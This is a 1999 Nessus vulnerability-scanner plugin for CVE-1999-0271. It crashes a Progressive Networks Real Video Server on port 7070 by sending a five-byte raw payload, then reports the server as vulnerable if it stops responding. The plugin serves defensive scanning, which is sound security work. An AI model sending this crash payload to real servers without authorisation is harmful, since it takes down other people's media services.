#
# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
#
# See the Nessus Scripts License for details
#

if(description)
{
 script_id(10183);
 script_version ("$Revision: 1.14 $");
 script_cve_id("CVE-1999-0271");
 name["english"] = "pnserver crash";
 name["francais"] = "crash de pnserver";
 script_name(english:name["english"], francais:name["francais"]);
 
 desc["english"] = "
It was possible to crash the remote
Progressive Networks Real Video Server
by sending it some garbage.

An attacker may use this flaw to prevent
you from sharing sound and video, which
may alter the quality of your service

Solution : Contact Progressive Networks for
a patch.

Risk factor : Medium";

 desc["francais"] = "
Il s'est avéré possible de faire planter le
serveur Real Video de Progressive Networks
qui tournait sur cette machine en lui
envoyant n'importe quoi.

Un pirate peut utiliser ce problème pour
vous empecher de partager son et vidéo,
altérant ainsi la qualité de votre
service.

Solution : Contactez Progressive Networks et demandez un
patch.

Facteur de risque : Moyen";

 script_description(english:desc["english"], francais:desc["francais"]);
 
 summary["english"] = "Crashes the remote pnserver";
 summary["francais"] = "Plante le pnserver distant";
 script_summary(english:summary["english"], francais:summary["francais"]);
 
 script_category(ACT_DENIAL);
 
 
 script_copyright(english:"This script is Copyright (C) 1999 Renaud Deraison",
		francais:"Ce script est Copyright (C) 1999 Renaud Deraison");
 family["english"] = "Denial of Service";
 family["francais"] = "Déni de service";
 script_family(english:family["english"],  francais:family["francais"]);
 
 script_require_ports(7070, "Services/realserver");
 script_dependencies("find_service.nes");
 exit(0);
}

#
# The script code starts here
#

port = get_kb_item("Services/realserver");
if(!port)port = 7070;
if(get_port_state(port))
{
 soc = open_sock_tcp(port);
 if(soc)
 {
  crp = raw_string(255,244,255,253,6);
  send(socket:soc, data:crp, length:5);
  close(soc);
  sleep(5);
  
  soc2 = open_sock_tcp(port);
  if(!soc2)security_warning(port);
  else close(soc2);
  }
}
